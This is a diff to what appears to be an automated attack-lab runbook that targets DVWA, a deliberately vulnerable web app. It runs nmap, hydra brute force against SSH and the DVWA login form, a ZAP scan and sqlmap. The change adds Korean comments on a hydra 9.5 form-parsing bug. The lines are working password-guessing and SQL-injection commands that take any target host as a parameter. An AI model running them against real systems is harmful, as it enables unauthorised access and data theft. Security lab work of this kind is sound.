@@ -72,7 +72,9 @@ mainSteps:
         - '{ echo "== [1] nmap =="; docker run --rm attacker:latest nmap -Pn -sV -T4 -p 22,80,443,3306,8080,8081 "{{ TargetHost }}"; } >"$D/1-nmap.txt" 2>&1 &'
         - '{ echo "== [2] hydra ssh ({{ SshUser }}) =="; docker run --rm -v $WL:/wl attacker:latest hydra -l "{{ SshUser }}" -P /wl/pass.txt -t 8 -I "ssh://{{ TargetHost }}"; } >"$D/2-hydra-ssh.txt" 2>&1 &'
         - 'if [ -n "{{ WebBaseUrl }}" ]; then'
-        - '  { echo "== [3] hydra dvwa web (session $SID) =="; docker run --rm -v $WL:/wl attacker:latest hydra -L /wl/users.txt -P /wl/pass.txt -t 8 -s "$WPORT" "$WHOST" http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie\: PHPSESSID=$SID; security=low"; } >"$D/3-hydra-web.txt" 2>&1 &'
+        - '  # hydra 9.5 http-form 은 조건 필드에 F= 접두어를 붙이면 "no valid optional parameter
+        - '  # type given: F" 로 파싱이 깨진다(2026-09-30 사고). 접두어 없이 실패 문자열만 쓴다.'
+        - '  { echo "== [3] hydra dvwa web (session $SID) =="; docker run --rm -v $WL:/wl attacker:latest hydra -L /wl/users.txt -P /wl/pass.txt -t 8 -s "$WPORT" "$WHOST" http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie\: PHPSESSID=$SID; security=low"; } >"$D/3-hydra-web.txt" 2>&1 &'
         - '  { echo "== [4] zap baseline =="; docker run --rm zaproxy/zap-stable zap-baseline.py -t "{{ WebBaseUrl }}" -I; } >"$D/4-zap.txt" 2>&1 &'
         - '  { echo "== [5] sqlmap =="; docker run --rm attacker:latest sqlmap -u "{{ WebBaseUrl }}/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SID; security=low" --random-agent --batch --level=2 --risk=2; } >"$D/5-sqlmap.txt" 2>&1 &'
         - 'else'
